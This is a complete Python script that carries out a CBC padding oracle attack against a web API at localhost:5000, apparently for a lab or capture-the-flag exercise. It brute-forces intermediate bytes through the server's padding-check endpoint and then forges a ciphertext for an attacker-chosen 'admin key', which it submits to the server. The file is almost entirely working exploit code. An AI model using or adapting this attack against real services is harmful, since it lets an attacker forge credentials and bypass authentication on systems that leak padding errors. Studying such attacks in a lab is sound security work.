# padding oracle attack

import os
import requests
from Crypto.Util.Padding import pad, unpad

server_addr = "http://localhost:5000"

class Oracle:
    def __init__(self):
        resp = requests.get(server_addr + "/api/generate_key")
        resp_json = resp.json()
        self.iv, self.ciphertext = bytes.fromhex(resp_json['key'])[:16], bytes.fromhex(resp_json['key'])[16:]
        self.block_size = 16

    def query(self, ciphertext_block: bytes) -> bool:
        key_hex = ciphertext_block.hex()
        resp = requests.get(
            server_addr + "/api/check" + f"/{key_hex}"
        )
        resp_json = resp.json()
        return resp_json.get('ok') # if not ok assume padding error
    
    def decrypt_block(self, target_block: bytes) -> bytes:
        print("  Decrypting block...", flush=True)
        intermediate  = bytearray(self.block_size)
        
        for byte_pos in range(self.block_size -1, -1, -1):
            # brute force each byte
            padding_value = self.block_size - byte_pos # padding value forcing depends on position of byte

            attack_block = bytearray(self.block_size)
            # attack block is rebuilt for each byte
            for known_pos in range(byte_pos + 1, self.block_size):
                attack_block[known_pos] = intermediate[known_pos] ^ padding_value
            
            # in this way, when decrypted the value will be padding_value (intermediate ^ intermediate cancels out)
            found = False

            for guess in range(256):
                attack_block[byte_pos] = guess
                test_data = bytes(attack_block) + target_block
                if self.query(test_data):
                    # valid padding found
                    if padding_value == 1:
                        # verification: last byte could be 1 or 2
                        verification = bytearray(attack_block)
                        verification[-2] ^= 1
                        if self.query(bytes(verification) + target_block):
                            # even after changing -2 its still valid
                            intermediate[byte_pos] = guess ^ padding_value
                            found = True
                            break
                    else: 
                        intermediate[byte_pos] = guess ^ padding_value
                        found = True
                        break
            if found:
                print(f" Found! ( intermediate byte value: 0x{intermediate[byte_pos]:02x})", flush=True)
            else:
                print("failed at byte" + str(byte_pos) + "of block", flush=True)
                print("is the oracle correct?", flush=True)
        # returns intermediate
        return intermediate
    
    def encrypt(self, plaintext: str):
        # First, create a forged ciphertext starting from right to left
        padded_plaintext = pad(plaintext.encode(), 16)
        num_blocks = len(padded_plaintext) // 16
        blocks = [padded_plaintext[i*16:(i+1)*16] for i in range(num_blocks)]
        forged_ciphertext = self.ciphertext[:16]

        print("  Crafting ciphertext blocks...")
        for block_id in range(num_blocks -1, -1, -1):

            print("Finding intermediate for block " + str(block_id))
            # decrypt new block to get previous intermediate
            intermediate = self.decrypt_block(
                forged_ciphertext[:16] 
            )
            print(" Intermediate found: " + intermediate.hex())

            target_plaintext = blocks[block_id]
            crafted_prev = bytes([intermediate[i] ^ target_plaintext[i] for i in range(self.block_size)])
            # when decrypting, server runs intermediate ^ prev_ciphertext getting target_plaintext
            forged_ciphertext = crafted_prev + forged_ciphertext
        return forged_ciphertext # returns full ciphertext including iv
    
if __name__ == "__main__":
    oracle = Oracle()

    attacker_desired_plaintext = "v@l1d_adm1n_k3y_thatimadesure_is2blocks+long_:)"
    print(f"\nForging plaintext: '{attacker_desired_plaintext}'")

    forged_ciphertext = oracle.encrypt(attacker_desired_plaintext)
    forged_key_hex = forged_ciphertext.hex()

    print(f"\nForged ciphertext (hex): {forged_key_hex}")

    # Now test the forged key on the server
    resp = requests.get(
        server_addr + "/api/check" + f"/{forged_key_hex}"
    )
    resp_json = resp.json()
    print(f"\nServer response to forged key:")
    print(resp_json)